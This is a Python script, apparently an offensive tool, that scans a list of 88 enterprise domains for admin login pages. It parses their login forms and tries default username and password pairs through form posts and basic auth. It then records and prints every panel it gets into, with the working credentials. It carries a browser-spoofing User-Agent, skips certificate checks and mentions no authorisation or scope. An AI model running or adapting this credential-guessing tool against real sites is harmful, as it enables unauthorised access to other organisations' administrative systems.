#!/usr/bin/env python3
"""
Enterprise Admin Panel Scanner
Scans 88 enterprise sites for exposed admin panels, SQL injection points, and default credentials.
"""
import requests
import urllib3
import sys
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
TIMEOUT = 3
MAX_WORKERS = 20
SCAN_DIR = "/tmp/scan_results"
OUTPUT_FILE = "/tmp/admin_scan_results.json"

# Paths to check
ADMIN_PATHS = [
    "/admin",
    "/admin/login",
    "/login",
    "/admin.php",
    "/wp-admin",
]

# Default credential combinations to try
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "admin888"),
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
}

def load_domains():
    """Load all domain names from scan_results JSON files"""
    domains = []
    for fname in sorted(os.listdir(SCAN_DIR)):
        if fname.endswith('.json'):
            domain = fname.replace('.json', '')
            if domain.startswith('www.'):
                domain = domain[4:]
            domains.append(domain)
    return domains

def check_url(url, session, allow_redirects=True):
    """Check a URL and return status info"""
    try:
        resp = session.get(
            url,
            timeout=TIMEOUT,
            allow_redirects=allow_redirects,
            verify=False,
            headers=HEADERS
        )
        text = resp.text[:5000] if resp.text else ""
        return {
            "url": url,
            "status_code": resp.status_code,
            "final_url": resp.url if allow_redirects else url,
            "size": len(resp.content),
            "server": resp.headers.get("Server", ""),
            "x_powered_by": resp.headers.get("X-Powered-By", ""),
            "has_login_form": 'type="password"' in text.lower(),
            "has_username_field": any(k in text.lower() for k in ['name="user', 'name="username', 'name="login', 'name="admin']),
            "title": "",
            "headers": dict(resp.headers),
        }
    except requests.exceptions.Timeout:
        return {"url": url, "status_code": 0, "error": "timeout"}
    except requests.exceptions.ConnectionError:
        return {"url": url, "status_code": 0, "error": "connection_refused"}
    except Exception as e:
        return {"url": url, "status_code": 0, "error": str(e)[:100]}

def extract_title(html):
    """Extract title from HTML"""
    import re
    m = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
    return m.group(1).strip() if m else ""

def detect_login_form_fields(html):
    """Detect login form field names and action URL"""
    import re
    result = {
        "action": "",
        "method": "post",
        "username_field": "",
        "password_field": "",
        "extra_fields": {},
        "has_captcha": False,
    }
    
    # Find form action
    m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        result["action"] = m.group(1)
    
    # Find form method
    m = re.search(r'<form[^>]*method=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        result["method"] = m.group(1).lower()
    
    # Find password field - this is a strong indicator of login form
    pw_match = re.search(r'<input[^>]*type=["\']password["\'][^>]*name=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if pw_match:
        result["password_field"] = pw_match.group(1)
    
    # Find username/email field
    for pattern in [
        r'<input[^>]*name=["\'](?:user|username|login|email|admin|account|name|uname)["\']',
        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\'](?:text|email)["\']',
    ]:
        m = re.search(pattern, html, re.IGNORECASE)
        if m:
            result["username_field"] = m.group(1)
            break
    
    # Detect captcha
    if re.search(r'(captcha|verify|验证码|verification)', html, re.IGNORECASE):
        result["has_captcha"] = True
    
    # Find hidden fields
    for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', html, re.IGNORECASE):
        result["extra_fields"][m.group(1)] = m.group(2)
    
    return result

def try_login(session, base_url, login_path, username, password, form_info):
    """Try a single login attempt with given credentials"""
    try:
        # Build login URL
        if form_info.get("action", "").startswith("http"):
            login_action = form_info["action"]
        elif form_info.get("action", ""):
            login_action = urljoin(base_url, form_info["action"])
        else:
            login_action = base_url
        
        # Build form data
        data = {}
        uname_field = form_info.get("username_field", "username")
        pw_field = form_info.get("password_field", "password")
        data[uname_field] = username
        data[pw_field] = password
        
        # Add hidden fields
        data.update(form_info.get("extra_fields", {}))
        
        # Add common submit button names
        data["submit"] = "1"
        
        resp = session.post(
            login_action,
            data=data,
            timeout=TIMEOUT,
            allow_redirects=True,
            verify=False,
            headers=HEADERS,
        )
        
        # Check for login success indicators
        text = resp.text[:3000] if resp.text else ""
        text_lower = text.lower()
        status = resp.status_code
        final_url = resp.url
        
        # Failure indicators
        failure_keywords = [
            "密码错误", "用户名错误", "账号不存在", "登录失败",
            "password error", "incorrect password", "invalid username",
            "wrong password", "login failed", "invalid credentials",
            "用户名或密码", "账号或密码", "用户名/密码",
        ]
        
        # Success indicators
        success_keywords = [
            "登录成功", "login success", "welcome", "dashboard",
            "控制面板", "后台管理", "管理首页", "admin panel",
        ]
        
        has_failure = any(kw in text_lower for kw in failure_keywords)
        has_success = any(kw in text_lower for kw in success_keywords)
        
        # Also check redirect behavior
        if status == 302:
            redirect_url = resp.headers.get("Location", "")
            if "login" not in redirect_url.lower() and "error" not in redirect_url.lower():
                has_success = True
        
        # Check if we're redirected away from login page
        if not has_failure and not has_success:
            if "login" not in final_url.lower() and status == 200:
                # Might be success - check if page has dashboard/admin indicators
                if any(ind in text_lower for ind in ["dashboard", "admin", "管理", "后台", "panel", "控制"]):
                    has_success = True
        
        return {
            "username": username,
            "password": password,
            "status_code": status,
            "final_url": final_url,
            "success": has_success and not has_failure,
            "failure_detected": has_failure,
            "response_size": len(resp.content),
        }
    except Exception as e:
        return {
            "username": username,
            "password": password,
            "status_code": 0,
            "error": str(e)[:100],
            "success": False,
        }

def scan_domain(domain):
    """Scan a single domain for admin panels and try default creds"""
    result = {
        "domain": domain,
        "admin_panels": [],
        "accessible_panels": [],
        "login_attempts": [],
        "errors": [],
    }
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{domain}"
        
        for path in ADMIN_PATHS:
            url = f"{base_url}{path}"
            
            # First check without following redirects
            check = check_url(url, session, allow_redirects=False)
            
            if check.get("error"):
                continue
            
            status = check["status_code"]
            
            if status == 0:
                continue
            
            panel_info = {
                "url": url,
                "status_code": status,
                "protocol": protocol,
                "path": path,
                "server": check.get("server", ""),
                "x_powered_by": check.get("x_powered_by", ""),
            }
            
            # Follow redirect if 301/302
            if status in (301, 302, 307, 308):
                location = check.get("headers", {}).get("Location", "")
                check2 = check_url(url, session, allow_redirects=True)
                panel_info["redirects_to"] = location
                panel_info["final_status"] = check2.get("status_code", 0)
                panel_info["final_url"] = check2.get("final_url", "")
                panel_info["size"] = check2.get("size", 0)
                
                if check2.get("status_code", 0) in (200, 401, 403):
                    panel_info["has_login_form"] = check2.get("has_login_form", False)
                    result["admin_panels"].append(panel_info)
            
            elif status == 200:
                panel_info["size"] = check.get("size", 0)
                
                if check.get("has_login_form"):
                    panel_info["has_login_form"] = True
                    result["admin_panels"].append(panel_info)
                elif check.get("size", 0) > 100:
                    # Follow redirect to get full page
                    check2 = check_url(url, session, allow_redirects=True)
                    if check2.get("has_login_form"):
                        panel_info["has_login_form"] = True
                        panel_info["final_status"] = check2.get("status_code", 0)
                        panel_info["final_url"] = check2.get("final_url", "")
                    result["admin_panels"].append(panel_info)
            
            elif status == 401:
                panel_info["auth_required"] = True
                result["admin_panels"].append(panel_info)
                # Try basic auth with default creds
                for uname, pwd in DEFAULT_CREDS:
                    try:
                        resp = requests.get(
                            url,
                            auth=(uname, pwd),
                            timeout=TIMEOUT,
                            verify=False,
                            headers=HEADERS,
                        )
                        if resp.status_code == 200:
                            panel_info["basic_auth_success"] = f"{uname}:{pwd}"
                            result["accessible_panels"].append({
                                "url": url,
                                "credentials": f"{uname}:{pwd}",
                                "type": "basic_auth",
                            })
                            break
                    except:
                        pass
            
            elif status == 403:
                panel_info["forbidden"] = True
                result["admin_panels"].append(panel_info)
    
    # For panels with login forms, try default credentials
    for panel in result["admin_panels"]:
        if not panel.get("has_login_form"):
            continue
        
        url = panel.get("final_url") or panel["url"]
        
        try:
            # Get the page to extract form details
            resp = session.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
            html = resp.text
            
            title = extract_title(html)
            panel["title"] = title
            
            form_info = detect_login_form_fields(html)
            panel["form_info"] = form_info
            
            if not form_info.get("password_field"):
                continue  # No password field = not a real login form
            
            # Try default credentials
            for username, password in DEFAULT_CREDS:
                attempt = try_login(session, url, panel["path"], username, password, form_info)
                attempt["panel_url"] = url
                result["login_attempts"].append(attempt)
                
                if attempt.get("success") and not attempt.get("failure_detected"):
                    result["accessible_panels"].append({
                        "url": url,
                        "credentials": f"{username}:{password}",
                        "type": "form_login",
                        "final_url": attempt.get("final_url", ""),
                    })
                    break  # Found working credentials, stop trying more
                
                # Small delay to avoid rate limiting
                import time
                time.sleep(0.3)
                
        except Exception as e:
            result["errors"].append(f"Login attempt error for {url}: {str(e)[:100]}")
    
    return result

def main():
    domains = load_domains()
    print(f"[*] Loaded {len(domains)} domains from {SCAN_DIR}")
    print(f"[*] Checking paths: {ADMIN_PATHS}")
    print(f"[*] Default credentials: {DEFAULT_CREDS}")
    print(f"[*] Timeout: {TIMEOUT}s, Workers: {MAX_WORKERS}")
    print("=" * 70)
    
    results = []
    completed = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(scan_domain, d): d for d in domains}
        
        for future in as_completed(futures):
            domain = futures[future]
            completed += 1
            try:
                result = future.result()
                results.append(result)
                
                # Print progress
                panels_found = len(result["admin_panels"])
                accessible = len(result["accessible_panels"])
                status = ""
                if accessible:
                    status = f" *** {accessible} ACCESSIBLE PANEL(S) FOUND! ***"
                elif panels_found:
                    status = f" ({panels_found} panel(s))"
                
                print(f"[{completed}/{len(domains)}] {domain}{status}")
                
                # Print accessible panels immediately
                for ap in result["accessible_panels"]:
                    print(f"  >>> ACCESSIBLE: {ap['url']} | {ap['credentials']} | {ap['type']}")
                
            except Exception as e:
                print(f"[{completed}/{len(domains)}] {domain} - ERROR: {e}")
                results.append({"domain": domain, "error": str(e)})
    
    # Save full results
    print("\n" + "=" * 70)
    print(f"[*] Saving results to {OUTPUT_FILE}")
    
    with open(OUTPUT_FILE, 'w') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    # Summary
    total_panels = sum(len(r.get("admin_panels", [])) for r in results)
    total_accessible = sum(len(r.get("accessible_panels", [])) for r in results)
    total_login_attempts = sum(len(r.get("login_attempts", [])) for r in results)
    
    print(f"\n{'='*70}")
    print(f"SCAN SUMMARY")
    print(f"{'='*70}")
    print(f"Total domains scanned: {len(results)}")
    print(f"Admin panels found: {total_panels}")
    print(f"Accessible panels (default creds): {total_accessible}")
    print(f"Login attempts made: {total_login_attempts}")
    print(f"\n--- ACCESSIBLE PANELS ---")
    
    accessible_domains = []
    for r in results:
        for ap in r.get("accessible_panels", []):
            line = f"  {r['domain']} | {ap['url']} | {ap['credentials']} | {ap['type']}"
            print(line)
            accessible_domains.append(line)
    
    if not accessible_domains:
        print("  (none)")
    
    print(f"\n--- ALL ADMIN PANELS FOUND ---")
    for r in results:
        for p in r.get("admin_panels", []):
            status = p.get("status_code", "?")
            has_form = " [LOGIN FORM]" if p.get("has_login_form") else ""
            auth = " [BASIC AUTH]" if p.get("auth_required") else ""
            forbidden = " [FORBIDDEN]" if p.get("forbidden") else ""
            redirect = f" -> {p.get('redirects_to', '')}" if p.get('redirects_to') else ""
            title = f" | {p.get('title', '')}" if p.get('title') else ""
            print(f"  {r['domain']} | {p['url']} | HTTP {status}{redirect}{has_form}{auth}{forbidden}{title}")
    
    # Save summary
    summary = {
        "total_domains": len(results),
        "total_panels": total_panels,
        "total_accessible": total_accessible,
        "total_login_attempts": total_login_attempts,
        "accessible_panels": [],
        "all_panels": [],
    }
    
    for r in results:
        for ap in r.get("accessible_panels", []):
            summary["accessible_panels"].append({
                "domain": r["domain"],
                "url": ap["url"],
                "credentials": ap["credentials"],
                "type": ap["type"],
            })
        for p in r.get("admin_panels", []):
            summary["all_panels"].append({
                "domain": r["domain"],
                "url": p["url"],
                "status_code": p.get("status_code"),
                "has_login_form": p.get("has_login_form", False),
                "server": p.get("server", ""),
                "title": p.get("title", ""),
            })
    
    with open("/tmp/admin_scan_summary.json", 'w') as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    
    print(f"\nFull results: {OUTPUT_FILE}")
    print(f"Summary: /tmp/admin_scan_summary.json")

if __name__ == "__main__":
    main()
